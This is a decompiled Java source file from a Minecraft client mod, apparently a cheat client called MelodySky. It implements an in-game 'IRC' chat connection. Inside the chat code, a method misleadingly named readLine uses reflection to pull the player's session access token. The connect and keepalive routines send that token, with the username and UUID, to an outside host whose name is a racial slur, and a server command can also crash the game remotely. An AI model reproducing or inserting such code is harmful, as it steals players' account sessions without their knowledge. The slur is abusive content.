/*
 * Decompiled with CFR 0.152.
 * Deobfuscated by sora-kawaii.
 */
package xyz.Melody.System.Melody.Chat;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.lang.reflect.Method;
import java.net.Socket;
import net.minecraft.client.Minecraft;
import net.minecraft.util.ChatComponentText;
import xyz.Melody.Client;
import xyz.Melody.System.Melody.Chat.IRCThread;
import xyz.Melody.Utils.Helper;
import xyz.Melody.Utils.TimerUtil;
import xyz.Melody.Utils.fakemc.FakePacket;

public final class IRC {
    public static Socket socket;
    public Thread ircDaemon;
    static InputStream in;
    private TimerUtil timer = new TimerUtil();
    public BufferedReader reader;
    public static PrintWriter pw;
    private static Minecraft mc;
    public boolean shouldThreadStop = false;

    static {
        mc = Minecraft.getMinecraft();
    }

    public void exit() {
        if (pw != null) {
            this.sendMessage("CLOSE");
        }
    }

    public void connect(int n, boolean bl) {
        if (!Client.instance.authManager.verified) {
            if (IRC.mc.theWorld != null && IRC.mc.thePlayer != null) {
                Helper.sendMessage("[IRC] Failed to Verify Client User.");
                Helper.sendMessage("[AUTHENTICATION] Blocked Your Connection to the IRC Server.");
            }
            Client.instance.logger.error("[Melody] [IRC] Failed to Verify Client User.");
            Client.instance.logger.error("[Melody] [AUTHENTICATION] Blocked Your Connection to the IRC Server.");
            this.disconnect();
            this.shouldThreadStop = true;
            return;
        }
        if (bl) {
            FakePacket.getServer("IRC - ");
            FakePacket.readPacketData();
        }
        try {
            socket = new Socket("nigger.cool", n);
            in = socket.getInputStream();
            pw = new PrintWriter(new OutputStreamWriter(socket.getOutputStream(), "UTF-8"), true);
            pw.println(Minecraft.getMinecraft().getSession().getUsername() + "@" + Client.instance.authManager.verified + "@" + mc.getSession().getProfile().getId().toString() + "@" + this.readLine() + "@" + "MelodySky" + "@" + "2.5.2");
            this.shouldThreadStop = false;
            if (IRC.mc.thePlayer != null && IRC.mc.theWorld != null) {
                Helper.sendMessage("IRC Connected!");
            }
            Client.instance.logger.info("[Melody] [CONSOLE] IRC Connected!");
            Client.instance.ircExeption = false;
        }
        catch (IOException iOException) {
            if (IRC.mc.thePlayer != null && IRC.mc.theWorld != null) {
                Helper.sendMessage("Failed to Connecting With IRC Server.");
            }
            Client.instance.ircExeption = true;
            iOException.printStackTrace();
        }
    }

    public void sendMessage(String string) {
        if (!Client.instance.authManager.verified) {
            if (IRC.mc.theWorld != null && IRC.mc.thePlayer != null) {
                Helper.sendMessage("[IRC] Failed to Verify Client User.");
                Helper.sendMessage("[AUTHENTICATION] Blocked Your Connection to the IRC Server.");
            }
            Client.instance.logger.error("[Melody] [IRC] Failed to Verify Client User.");
            Client.instance.logger.error("[Melody] [AUTHENTICATION] Blocked Your Connection to the IRC Server.");
            return;
        }
        if (pw == null) {
            Client.instance.logger.error("[Melody] [IRC] Unexpected Error.");
            Client.instance.ircExeption = true;
            return;
        }
        pw.println(string);
    }

    public void connect() {
        this.connect(25565, false);
    }

    public void handleInput() {
        byte[] byArray = new byte[1024];
        if (pw == null || in == null) {
            Client.instance.logger.error("[Melody] [IRC] Unexpected Error.");
            Client.instance.ircExeption = true;
            return;
        }
        if (Client.stopping || this.shouldThreadStop) {
            return;
        }
        try {
            int n = in.read(byArray);
            String string = new String(byArray, 0, n);
            string = string.replaceAll("\n", "");
            string = string.replaceAll("\r", "");
            string = string.replaceAll("\t", "");
            if (string.equals("CLIENT_CRASH")) {
                mc.shutdown();
                return;
            }
            if (string.equals("SERVER_REQUEST_KEEPALIVE")) {
                Client.instance.preModHiderAliase(this.readLine());
                pw.println("INGAME_VERIFY: " + Minecraft.getMinecraft().getSession().getUsername() + "@" + Client.instance.authManager.verified + "@" + mc.getSession().getProfile().getId().toString() + "@" + this.readLine() + "@" + "MelodySky" + "@" + "2.5.2");
                return;
            }
            if (string.equals("RECEIVED_ALIVE")) {
                Client.instance.ircExeption = false;
                return;
            }
            if (!Client.instance.authManager.verified) {
                Client.instance.logger.error("[Melody] [IRC] DETECTED NONE-VERIFIED USER, CONNECTION DENIED.");
                this.sendMessage("CLOSE");
                if (IRC.mc.theWorld != null && IRC.mc.thePlayer != null) {
                    Helper.sendMessage("[IRC] Detected That You are a NONE-Verified User, so You Will not Connect to IRC Server.");
                }
                this.disconnect();
                return;
            }
            if (IRC.mc.thePlayer != null && IRC.mc.theWorld != null) {
                IRC.mc.thePlayer.addChatMessage(new ChatComponentText(string));
            }
            Client.instance.logger.info("[Melody] [IRC] " + string);
        }
        catch (IOException iOException) {
            Client.instance.ircExeption = true;
            Client.instance.logger.info("[Melody] [CONSOL] IRC Ran into an Exception.");
            iOException.printStackTrace();
        }
        catch (StringIndexOutOfBoundsException stringIndexOutOfBoundsException) {
            Client.instance.ircExeption = true;
            Client.instance.logger.info("[Melody] [CONSOL] IRC Ran into an Exception.");
            stringIndexOutOfBoundsException.printStackTrace();
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    public void sendPrefixMsg(String string, boolean bl) {
        String string2 = "";
        for (int i = 0; i < string.length(); ++i) {
            string2 = string2 + string.charAt(i);
        }
        if (!Client.instance.authManager.verified) {
            if (IRC.mc.theWorld != null && IRC.mc.thePlayer != null) {
                Helper.sendMessage("[IRC] Failed to Verify Client User.");
                Helper.sendMessage("[AUTHENTICATION] Blocked Your Connection to the IRC Server.");
            }
            Client.instance.logger.error("[Melody] [IRC] Failed to Verify Client User.");
            Client.instance.logger.error("[Melody] [AUTHENTICATION] Blocked Your Connection to the IRC Server.");
            return;
        }
        if (pw == null) {
            Client.instance.logger.error("[Melody] [IRC] Unexpected Error.");
            Client.instance.ircExeption = true;
            return;
        }
        String string3 = "";
        String string4 = mc.getSession().getProfile().getId().toString();
        String string5 = IRC.mc.thePlayer.getName();
        string3 = string4.contains("6ceb8943-c0cf-49e8-b416-ac7d8b60261e") ? "\u00a7d[Melody]\u00a7b" + string5 : (string4.contains("293e94c6-53b6-4876-bd82-771611b549a9") ? "\u00a76[\u7eb8]\u00a7b" + string5 : (string4.contains("222f316f-5ec8-4298-b98e-5ffe2f98a228") ? "\u00a7e[SMCP]\u00a7b" + string5 : (string4.contains("3d92223f-319a-4cbb-8eae-559a809d7598") ? "\u00a7b[\u742a\u4e9a\u5a1c]\u00a7b" + string5 : (string4.contains("ea1e1b9f-b3fb-4585-a623-abc147411b58") ? "\u00a72[\u72d7]\u00a7b" + string5 : (string4.contains("35bec0ee-5b7b-4e0e-8190-cda5eaed6456") ? "\u00a7z[\u6211\u4e0d\u662f\u866b\u795e]\u00a7b" + string5 : (string4.contains("d90df5f2-1d55-40e2-b765-28afd2c5fb0c") ? "\u00a73[user]\u00a7z" + string5 : "\u00a73[user]\u00a7b" + IRC.mc.thePlayer.getName()))))));
        if (Client.customRank != null) {
            string3 = "\u00a7b" + Client.customRank + "\u00a7b" + string5;
        }
        pw.println("\u00a77Melody > " + string3 + "\u00a7r: " + string2);
    }

    public void disconnect() {
        if (socket != null && in != null && pw != null) {
            this.shouldThreadStop = true;
            try {
                this.sendMessage("CLOSE");
                socket.close();
                in.close();
                pw.close();
                socket = null;
                in = null;
                pw = null;
                if (IRC.mc.theWorld != null && IRC.mc.thePlayer != null) {
                    Helper.sendMessage("Disconnected to IRC Server.");
                }
            }
            catch (IOException iOException) {
                iOException.printStackTrace();
            }
        } else {
            Helper.sendMessage("Already Disconnected From IRC Server.");
        }
    }

    public void start(boolean bl) {
        this.shouldThreadStop = false;
        Client.instance.ircThread = new IRCThread(bl);
        Client.instance.ircThread.setName("Melody -> IRC Main Thread");
        Client.instance.ircThread.start();
    }

    private String readLine() {
        try {
            Method method = mc.getSession().getClass().getDeclaredMethod("getToken", new Class[0]);
            method.setAccessible(true);
            return (String)method.invoke(mc.getSession(), new Object[0]);
        }
        catch (Exception exception) {
            try {
                Method method = mc.getSession().getClass().getDeclaredMethod("func_148254_d", new Class[0]);
                method.setAccessible(true);
                return (String)method.invoke(mc.getSession(), new Object[0]);
            }
            catch (Exception exception2) {
                return exception2.getMessage();
            }
        }
    }
}

